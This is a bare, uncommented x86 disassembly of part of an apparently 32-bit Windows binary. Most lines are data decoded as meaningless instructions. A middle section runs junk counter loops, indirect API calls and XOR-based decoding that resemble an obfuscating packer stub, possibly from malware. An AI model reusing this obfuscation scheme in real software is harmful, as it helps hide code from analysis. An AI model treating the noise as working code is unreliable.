  4131ea:	or     eax,0xc853c276
  4131ef:	scas   eax,DWORD PTR es:[edi]
  4131f0:	push   0x8fe2a517
  4131f5:	and    cl,bl
  4131f7:	aas    
  4131f8:	das    
  4131f9:	xchg   edx,eax
  4131fb:	sbb    BYTE PTR [ecx-0x27],dh
  4131fe:	inc    esp
  4131ff:	out    0xc9,al
  413201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413202:	loopne 0x413205
  413204:	sbb    eax,0xba86db8e
  413209:	ins    DWORD PTR es:[edi],dx
  41320a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41320b:	xchg   ebp,eax
  41320c:	push   ss
  41320d:	or     DWORD PTR [ebp-0x37],edi
  413210:	pusha  
  413211:	jb     0x41326d
  413213:	dec    ebx
  413214:	dec    ebx
  413215:	xor    dl,bl
  413217:	adc    eax,ebx
  413219:	pop    ecx
  41321a:	sbb    al,0x6
  41321c:	fnsave [ecx+esi*2-0x7150837b]
  413223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413224:	les    edi,FWORD PTR [ebx+0x2b019df4]
  41322a:	lds    ebp,FWORD PTR [ebp+edx*1+0x5e]
  41322e:	cli    
  41322f:	ja     0x41320e
  413231:	adc    DWORD PTR [edi+0x41d00254],edi
  413237:	jae    0x413210
  413239:	pusha  
  41323a:	jns    0x413218
  41323c:	xchg   ebp,eax
  41323d:	jmp    0x4131ea
  41323f:	(bad)  
  413240:	xor    DWORD PTR [ebp-0x45],edx
  413243:	jmp    0xf4cd75aa
  413248:	add    DWORD PTR [esi],esp
  41324a:	adc    al,0x96
  41324c:	mov    WORD PTR [ebp-0xa66a1c3],es
  413252:	inc    ebp
  413253:	push   0x42622611
  413258:	pop    esi
  413259:	xlat   BYTE PTR ds:[ebx]
  41325a:	xchg   esp,eax
  41325b:	ret    
  41325c:	lock mov cl,0x28
  41325f:	dec    eax
  413260:	adc    dl,BYTE PTR [esi+0x1d]
  413263:	dec    ecx
  413264:	hlt    
  413265:	adc    cl,BYTE PTR [di+0x3a1b]
  41326a:	cmc    
  41326b:	mov    bl,0x8f
  41326d:	fndisi(8087 only) 
  41326f:	popa   
  413270:	dec    eax
  413271:	jo     0x413227
  413273:	(bad)  
  413274:	aam    0x32
  413276:	es (bad) 
  413278:	in     al,dx
  413279:	call   0x67f5cd9e
  41327e:	popf   
  41327f:	outs   dx,DWORD PTR ds:[esi]
  413280:	in     eax,dx
  413281:	pop    ss
  413282:	cdq    
  413283:	mov    bl,0x33
  413285:	dec    esi
  413286:	test   eax,0x3bc30436
  41328b:	test   DWORD PTR [ecx+edx*4-0x5d],eax
  41328f:	(bad)  
  413290:	jle    0x413259
  413292:	aaa    
  413293:	mov    al,0x41
  413295:	dec    eax
  413296:	(bad)  
  413297:	lds    ecx,FWORD PTR [esi]
  413299:	cli    
  41329a:	sbb    DWORD PTR [esi+0x3e],esi
  41329d:	xor    eax,0x857ef79b
  4132a2:	pop    edi
  4132a3:	jne    0x41328c
  4132a5:	lods   al,BYTE PTR ds:[esi]
  4132a6:	adc    al,cl
  4132a8:	test   BYTE PTR [ecx+0x504338f3],bl
  4132ae:	cmp    ah,BYTE PTR [ebx+0x3cd3381f]
  4132b4:	jp     0x413314
  4132b6:	mov    ebx,0xd46aad17
  4132bb:	call   0xd11c:0x851e1ce4
  4132c2:	sbb    DWORD PTR [ecx+ebx*8+0x28],edi
  4132c6:	xchg   DWORD PTR [ecx],ebp
  4132c8:	ret    
  4132c9:	jne    0x413260
  4132cb:	sbb    eax,0xa945c320
  4132d0:	bound  esp,QWORD PTR fs:[edx+0x7ad1d287]
  4132d7:	sar    DWORD PTR [esi+ebx*2],1
  4132da:	mov    ebx,DWORD PTR [esi-0x4ee64087]
  4132e0:	cdq    
  4132e1:	pushf  
  4132e2:	mov    ds:0x3c25b372,al
  4132e7:	fiadd  WORD PTR [edx-0x1a852af1]
  4132ed:	add    BYTE PTR [ebp+0x3f],dh
  4132f0:	in     eax,0xd1
  4132f2:	lds    ebp,FWORD PTR [ecx]
  4132f4:	mov    edi,0xa86570d9
  4132f9:	xchg   ebx,eax
  4132fa:	int    0xf6
  4132fc:	mov    esp,0x61604100
  413301:	jnp    0x4132ca
  413303:	clc    
  413304:	(bad)  
  413305:	enter  0x77d2,0xbc
  413309:	mov    dh,0x98
  41330b:	stos   BYTE PTR es:[edi],al
  41330c:	jle    0x4132bc
  41330e:	mov    ds:0x16d921cd,al
  413313:	mov    bh,0x7e
  413315:	xchg   edi,eax
  413316:	jnp    0x413377
  413318:	mov    ds:0x8e75fced,al
  41331d:	test   eax,0x54130616
  413322:	test   DWORD PTR [eax+eax*1],eax
  413325:	xchg   esp,eax
  413326:	js     0x413327
  413328:	pop    esp
  413329:	data16 js 0x4132b3
  41332c:	push   edi
  41332d:	(bad)  
  41332e:	mov    esi,0x63fc458e
  413333:	mov    BYTE PTR [edi-0x181ca1d4],ch
  413339:	dec    edi
  41333a:	mov    esi,0xa89c1dd
  41333f:	mov    DWORD PTR ds:0x420e8e,0x16
  413349:	cmp    DWORD PTR ds:0x420e8e,0x0
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	xor    ebp,DWORD PTR [esp+ecx*4-0x33]
  413709:	mov    esi,0xa7a7a73
  41370e:	pop    edi
  41370f:	jp     0x41378b
  413711:	shr    DWORD PTR [edx],0x38
  413714:	sub    BYTE PTR [ecx],bl
  413716:	xchg   esi,eax
  413717:	test   al,0xf0
  413719:	dec    ebx
  41371a:	inc    esp
  41371b:	loope  0x413761
  41371d:	cmp    cl,bl
  41371f:	mov    edx,0x51d7070b
  413724:	pop    ebp
  413725:	and    DWORD PTR [ebx-0x418c23d9],0x3a757301
  41372f:	sub    eax,0x462c1bd4
  413734:	mov    esi,0xbbae21d2
  413739:	jl     0x413740
  41373b:	inc    ecx
  41373c:	pop    ecx
  41373d:	sar    DWORD PTR [ebx+ebp*4-0x2d],1
  413741:	lods   eax,DWORD PTR ds:[esi]
  413742:	ja     0x4136df
  413744:	div    BYTE PTR [ebx+0x39]
  413747:	(bad)  
  413748:	dec    ebp
  413749:	xor    eax,0xfa9ccb0d
  41374e:	push   esp
  41374f:	fistp  DWORD PTR [edi+0x448b8a0b]
  413755:	push   ss
  413756:	aam    0xeb
  413758:	in     al,dx
  413759:	mov    eax,ds:0xfcdbb283
  41375e:	mov    ah,0x23
  413760:	xchg   ebx,eax
  413761:	and    BYTE PTR [edi+0x280b7f33],al
  413767:	adc    esp,ebp
  413769:	das    
  41376a:	das    
  41376b:	mov    dl,0x27
  41376d:	stos   BYTE PTR es:[edi],al
  41376e:	hlt    
  41376f:	mov    eax,ds:0x66ed7577
  413774:	or     bl,BYTE PTR [eax-0x5b5ecd37]
  41377a:	outs   dx,DWORD PTR ds:[esi]
  41377b:	(bad)  
  41377c:	out    dx,eax
  41377d:	push   eax
  41377e:	xor    edx,DWORD PTR [edx-0x98085b0]
  413784:	js     0x4137c5
  413786:	inc    ecx
  413787:	clc    
  413788:	and    al,0x49
  41378a:	ds pop eax
  41378c:	js     0x41373e
  41378e:	mov    DWORD PTR [esi-0x2e],edx
  413791:	sbb    eax,0x714d1aa0
  413796:	out    0xec,al
  413798:	fisub  DWORD PTR [ebp-0x221cf801]
  41379e:	arpl   si,bx
  4137a0:	(bad)  
  4137a1:	(bad)  [ebx+edx*1]
  4137a4:	in     eax,0xf3
  4137a6:	test   DWORD PTR [eax+0x5a4abc2b],edx
  4137ac:	out    dx,al
  4137ad:	xor    DWORD PTR [ebp+0x249670b1],0xffffffa1
  4137b4:	test   dh,al
  4137b6:	je     0x413800
  4137b8:	mov    cl,0x67
  4137ba:	jmp    0x6b0a:0xf155f99f
  4137c1:	lea    esp,[edi-0x70]
  4137c4:	xchg   ebx,eax
  4137c5:	xor    DWORD PTR [ecx-0x62],edx
  4137c8:	popa   
  4137c9:	lods   eax,DWORD PTR ds:[esi]
  4137ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137cb:	out    dx,eax
  4137cc:	iret   
  4137cd:	iret   
  4137ce:	xchg   ebx,eax
  4137cf:	cmp    BYTE PTR [esi+ebp*2+0x3604dc99],0xe1
  4137d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137d8:	mov    al,0x64
  4137da:	inc    eax
  4137db:	lahf   
  4137dc:	sbb    dh,BYTE PTR [esi]
  4137de:	pop    edi
  4137df:	sti    
  4137e0:	out    0xce,eax
  4137e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137e3:	pop    ecx
  4137e4:	syscall 
  4137e6:	into   
  4137e7:	loopne 0x413803
  4137e9:	dec    ecx
  4137ea:	lea    ebx,[edi+0xe]
  4137ed:	mov    ebp,0x48ff0b8e
  4137f2:	aam    0x42
  4137f4:	push   eax
  4137f5:	lock test DWORD PTR [esi-0x6cefbf6a],0xf78ee2a5
  413800:	and    eax,0x6e3e6bb8
  413805:	imul   ebp,DWORD PTR [ecx],0x8c335743
  41380b:	rol    BYTE PTR [ebx],cl
  41380d:	or     BYTE PTR [eax-0x1b691406],ah
  413813:	xor    esi,DWORD PTR [ecx+ecx*8+0x8]
  413817:	add    edx,DWORD PTR [esi]
  413819:	pop    es
  41381a:	xor    BYTE PTR [edi],ch
  41381c:	div    BYTE PTR ds:0x82c11c68
  413822:	jbe    0x413895
  413824:	xchg   ecx,eax
  413825:	mov    cl,0xba
  413827:	add    edi,DWORD PTR [edx]
  413829:	loop   0x413849
  41382b:	sub    ch,BYTE PTR [ebp+0x18]
  41382e:	cmp    eax,0xec44e367
  413833:	(bad)  
  413834:	scas   al,BYTE PTR es:[edi]
  413835:	dec    esi
  413836:	(bad)  
  413838:	jne    0x413867
  41383a:	pop    esp
  41383b:	sub    BYTE PTR [ebx+0x4d45c304],bh
  413841:	daa    
  413842:	arpl   WORD PTR [ebx+0x14],cx
  413845:	stc    
  413846:	(bad)  
  413847:	cmc    
  413848:	call   0xbd7c:0xf46a5cc1
  41384f:	inc    esi
  413850:	leave  
  413851:	cmp    DWORD PTR [ebx-0x6e],esi
  413854:	arpl   si,si
  413856:	gs ret 0x593a
  41385a:	add    eax,DWORD PTR [edx+0x64]
  41385d:	mov    ds:0xe4f00a1,eax
  413862:	dec    esp
  413863:	dec    eax
  413864:	mov    cl,0x4e
  413866:	call   DWORD PTR ds:0xc708d7a
  41386c:	imul   ebx,DWORD PTR [edx*8-0x3be4aeca],0x6e5b3bf2
  413877:	xlat   BYTE PTR ds:[ebx]
  413878:	in     eax,dx
  413879:	test   esi,ebp
  41387b:	mov    bh,0x5d
  41387d:	mov    edx,0x62e4959b
  413882:	pusha  
  413883:	sar    DWORD PTR [edx-0x10e7457c],cl
  413889:	jmp    0x4138be
  41388b:	call   0xceb9:0xcad8e9fd
  413892:	mov    esi,DWORD PTR [ebp+0x1d]
  413895:	push   ebx
  413896:	pop    esi
  413897:	lods   al,BYTE PTR ds:[esi]
  413898:	cli    
  413899:	adc    BYTE PTR [edi],al
  41389b:	mov    ds:0xd60eb314,eax
  4138a0:	sahf   
  4138a1:	shr    esi,0xca
  4138a4:	inc    ebp
  4138a5:	sahf   
  4138a6:	popf   
  4138a7:	mov    al,0x30
  4138a9:	sub    al,0xad
  4138ab:	mov    al,BYTE PTR [ecx]
  4138ad:	push   eax
  4138ae:	or     eax,0x38115860
  4138b3:	adc    esp,DWORD PTR [ebp-0x39]
  4138b6:	inc    esi
  4138b7:	mov    edx,0xc10b8341
  4138bc:	out    dx,al
  4138bd:	add    DWORD PTR [esi+0x4a6579c9],edx
  4138c3:	lds    ecx,FWORD PTR [eax]
  4138c5:	mov    ds:0x7ae15bdd,eax
  4138ca:	or     al,0x24
  4138cc:	lahf   
  4138cd:	fisttp WORD PTR [eax-0x7451448b]
  4138d3:	dec    edx
  4138d4:	mov    ebp,0x4eb6bb7f
  4138d9:	jb     0x413927
  4138db:	in     al,dx
  4138dc:	cwde   
  4138dd:	push   ecx
  4138de:	lahf   
  4138df:	ret    
  4138e0:	mov    DWORD PTR [ebp+ecx*8-0x1d3e787],edx
  4138e7:	retf   0xfec5
  4138ea:	jg     0x4138b9
  4138ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138ee:	enter  0x2ca1,0xa6
  4138f2:	dec    esp
  4138f3:	pop    ds
  4138f4:	nop
  4138f5:	in     eax,0x10
  4138f7:	fidivr DWORD PTR gs:[ecx-0x53]
  4138fb:	js     0x4138d2
  4138fd:	push   ss
  4138fe:	bound  ebx,QWORD PTR ds:0xbefa33dc
  413904:	or     BYTE PTR [esi-0x4e],0x98
  413908:	mov    ebp,0x5ca4cae3
  41390d:	shr    BYTE PTR [ebx+0x682d1afe],cl
  413913:	lods   eax,DWORD PTR ds:[esi]
  413914:	ds xchg esp,eax
  413916:	adc    bl,dh
  413918:	cs out 0x67,eax
  41391b:	test   eax,0x3a50cbd5
  413920:	in     al,0xc2
  413922:	sbb    edi,DWORD PTR [eax]
  413924:	cmp    ah,BYTE PTR cs:[ecx]
  413927:	test   DWORD PTR [esi+eiz*1],eax
  41392a:	daa    
  41392b:	push   ebx
  41392c:	and    dl,ah
  41392e:	jnp    0x4138b2
  413930:	mov    eax,0xfcf9a22b
  413935:	and    ah,BYTE PTR [esi-0x6e8a5d99]
  41393b:	ds push 0xcc295a3f
  413941:	dec    edi
  413942:	pop    esp
  413943:	clc    
  413944:	lods   al,BYTE PTR ds:[esi]
  413945:	imul   ebx,DWORD PTR [ebp-0x6d],0xd3c1ece4
  41394c:	ja     0x4139be
  41394e:	out    0xc7,eax
  413950:	xor    al,dl
  413952:	or     DWORD PTR [ecx-0x5e341972],edx
  413958:	gs retf 
  41395a:	xchg   esp,eax
  41395b:	icebp  
  41395c:	lds    ebp,FWORD PTR [ebx]
  41395e:	sub    edx,ebx
  413960:	fistp  WORD PTR [ecx]
  413962:	in     al,0xd2
  413964:	adc    esp,esi
  413966:	ret    0x4ad4
  413969:	pop    ebp
  41396a:	fwait
  41396b:	cdq    
  41396c:	scas   eax,DWORD PTR es:[edi]
  41396d:	and    ecx,edx
  41396f:	stc    
  413970:	lahf   
  413971:	mov    ss,ebx
  413973:	xor    ebp,ecx
  413975:	adc    ecx,DWORD PTR [esi+0x116206df]
  41397b:	or     BYTE PTR [eax+0x71],0x4b
  41397f:	es pop ebx
  413981:	and    edx,DWORD PTR [eax-0x55f62ad1]
  413987:	mov    bh,0x1
  413989:	jge    0x41393f
  41398b:	shr    DWORD PTR [ecx-0x69],0x66
  41398f:	neg    BYTE PTR [esi-0x801a0b1]
  413995:	js     0x413948
  413997:	sti    
  413998:	dec    ecx
  413999:	sahf   
  41399a:	xor    edi,DWORD PTR [ecx]
  41399c:	test   esi,esi
  41399e:	fadd   QWORD PTR [ebx-0x169fe3c9]
  4139a4:	in     al,0xf1
  4139a6:	stc    
  4139a7:	inc    ebp
  4139a8:	and    eax,0xc517e4f6
  4139ad:	mov    ecx,0xc85ab61a
  4139b2:	pusha  
  4139b3:	add    cl,BYTE PTR [esi]
  4139b5:	icebp  
  4139b6:	push   ebp
  4139b7:	and    BYTE PTR ds:0xa0d185ca,ch
  4139bd:	pop    ebp
  4139be:	jle    0x413a3e
  4139c0:	push   cs
  4139c1:	jbe    0x413968
  4139c3:	ds mov al,0xcb
  4139c6:	jl     0x413966
  4139c8:	mov    edx,0x6f32ee8e
  4139cd:	sub    DWORD PTR [ecx+0x7c],ecx
  4139d0:	mov    edi,DWORD PTR ds:0x1eebc2c6
  4139d6:	stos   DWORD PTR es:[edi],eax
  4139d7:	sti    
  4139d8:	iret   
  4139d9:	in     al,dx
  4139da:	outs   dx,DWORD PTR ds:[esi]
  4139db:	add    BYTE PTR [bx+di+0x4f],ch
  4139df:	add    al,0x5a
  4139e1:	(bad)  
  4139e2:	out    dx,eax
  4139e3:	push   cs
  4139e4:	and    al,0x5a
  4139e6:	in     eax,dx
  4139e7:	or     ah,BYTE PTR [edx-0x30348671]
  4139ed:	push   esp
  4139ee:	mov    edi,0x42b727d6
  4139f3:	inc    ecx
  4139f4:	ins    BYTE PTR es:[edi],dx
  4139f5:	inc    esp
  4139f6:	sar    BYTE PTR [ebp+0x73809feb],1
  4139fc:	xchg   ebx,eax
  4139fd:	and    eax,0xe22ad7a8
  413a02:	mul    bl
  413a04:	jmp    0x1b06ef05
  413a09:	jmp    0x29c3:0x608e5359
  413a10:	inc    esp
  413a11:	inc    edi
  413a12:	imul   ebp,DWORD PTR [edx+0x685c4de],0xffffffd9
  413a19:	dec    esp
  413a1a:	pusha  
  413a1b:	cmp    DWORD PTR cs:[esi+ebp*8+0x1f],esi
  413a20:	cwde   
  413a21:	mov    bh,0x99
  413a23:	jb     0x4139d3
  413a25:	push   eax
  413a26:	out    dx,al
  413a27:	mov    dh,0xe8
  413a29:	sbb    eax,DWORD PTR [edi]
  413a2b:	test   DWORD PTR [esp+edx*8],ebp
  413a2e:	inc    ebp
  413a2f:	pop    edx
  413a30:	push   cs
  413a31:	out    dx,al
  413a32:	mov    ebp,0x16a49e7e
  413a37:	mov    ebp,0x7fd6e573
  413a3c:	mov    eax,ebp
  413a3e:	mov    edx,0x331886bb
  413a43:	mov    eax,edx
  413a45:	jp     0x413a48
  413a47:	push   es
  413a48:	mov    edx,0x231e057a
  413a4d:	sub    BYTE PTR [bp+di+0x33],dh
  413a51:	push   cs
  413a52:	hlt    
  413a53:	aas    
  413a54:	xchg   edi,eax
  413a55:	push   ebx
  413a56:	or     DWORD PTR [ecx],ebx
  413a58:	or     ah,ch
  413a5a:	and    eax,0xe6e3442d
  413a5f:	mov    edi,0x430bccd0
  413a64:	mov    al,dl
  413a66:	out    0xb5,eax
  413a68:	xlat   BYTE PTR ds:[ebx]
  413a69:	ret    
  413a6a:	mov    al,0x9c
  413a6c:	mov    al,ds:0x95fd3cf3
  413a71:	mov    al,ds:0xd477d97b
  413a76:	(bad)  
  413a77:	test   DWORD PTR [esi+0x4f],ecx
  413a7a:	add    al,0x8c
  413a7c:	lea    ebx,[ebx]
  413a7e:	mov    al,al
  413a80:	fsub   QWORD PTR [ebp+0x54ef04e7]
  413a86:	pop    ss
  413a87:	cdq    
  413a88:	mov    DWORD PTR [edx],ebp
  413a8a:	lea    edi,ds:0xb93d5d3e
  413a90:	xchg   esi,ecx
  413a92:	dec    edx
  413a93:	xchg   cx,ax
  413a95:	adc    eax,0x942a47fd
  413a9a:	sbb    al,0xe7
  413a9c:	outs   dx,BYTE PTR ds:[esi]
  413a9d:	mov    eax,ds:0x22fde726
  413aa2:	jmp    0x5a54:0x4a8b515
  413aa9:	aaa    
  413aaa:	ins    BYTE PTR es:[edi],dx
  413aab:	push   esi
  413aac:	call   0xa95:0xce75d9a2
  413ab3:	(bad)  
  413ab4:	je     0x6bb555ab
  413aba:	sub    BYTE PTR [eax-0x16533f1c],cl
  413ac0:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  413ac2:	mov    ds:0x33fcfb8b,eax
  413ac7:	inc    ebx
  413ac8:	or     edx,DWORD PTR [ebp-0x4]
  413acb:	fistp  DWORD PTR [eax+0x24]
  413ace:	mul    DWORD PTR [ebp-0xe794d5a]
  413ad4:	sub    BYTE PTR [ebp+0x654582f8],al
  413ada:	mov    esp,0xd7dba59a
  413adf:	mov    bl,0xf3
  413ae1:	push   edi
  413ae2:	fnstenv [esi-0x3e]
  413ae5:	xor    al,0x55
  413ae7:	jle    0x413af8
  413ae9:	ja     0x413af7
  413aeb:	add    edx,esp
  413aed:	inc    edi
  413aee:	add    BYTE PTR [esi+0x1de2d33e],0xa6
  413af5:	enter  0x147a,0xc4
  413af9:	ss in  al,0x95
  413afc:	and    al,0x18
  413afe:	inc    esi
  413aff:	dec    ebx
  413b00:	xchg   edi,eax
  413b01:	cmp    DWORD PTR [edx+0x41],ebp
  413b04:	jnp    0x413ad9
  413b06:	sub    ecx,DWORD PTR [edx+0x44c303b8]
  413b0c:	std    
  413b0d:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  413b10:	out    0x47,eax
  413b12:	clc    
  413b13:	mov    eax,0x67cb6425
  413b18:	jae    0x413ab9
  413b1a:	fstp   st(1)
  413b1c:	mov    bl,BYTE PTR [eax+ebp*4-0x16]
  413b20:	and    dl,BYTE PTR [edx]
  413b22:	adc    bl,bl
  413b24:	dec    esi
  413b25:	xor    DWORD PTR [esi+0x6b],ebx
  413b28:	mov    bl,0xf8
  413b2a:	shl    DWORD PTR [ebx],cl
